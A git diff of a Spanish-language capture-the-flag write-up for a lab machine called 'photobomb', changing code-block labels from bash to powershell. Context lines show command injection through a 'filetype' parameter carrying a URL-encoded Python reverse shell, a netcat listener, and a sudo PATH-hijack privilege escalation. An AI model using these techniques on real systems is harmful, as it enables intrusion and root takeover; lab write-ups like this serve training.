@@ -32,7 +32,7 @@ src='https://res.cloudinary.com/djc1umong/image/upload/v1665964126/bomb_burp_cut
 
 Haciendo pruebas con la herramienta, notamos que el parametro <i>filetype</i> se lo come con patatas, aca ingresamos una nuestra reverse Shell y escuchamos en:
 
-```bash
+```powershell
 $ nc -nlvp 4443
 ```
 
@@ -49,7 +49,7 @@ python3%20-c%20'import%20socket,subprocess,os;s=socket.socket(socket.AF_INET,soc
 
 Una vez dentro proseguimos al <Anchor src="#">obtener una bash</Anchor>
 
-```bash
+```powershell
 sudo -l
 ```
 
@@ -60,7 +60,7 @@ secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/
 User wizard may run the following commands on photobomb:
 (root) SETENV: NOPASSWD: /opt/cleanup.sh
 
-```bash
+```powershell
 cat /opt/cleanup.sh
 #!/bin/bash
 . /opt/.bashrc
@@ -79,7 +79,7 @@ find source_images -type f -name '*.jpg' -exec chown root:root {} \;
 
 notamos que al final del scrip en <i>/opt/cleanup.sh </i>ejecutamos chown root:root
 
-```bash
+```powershell
 id
 uid=1000(wizard) gid=1000(wizard) groups=1000(wizard)
 $ sudo PATH=/tmp:$PATH /opt/cleanup.sh
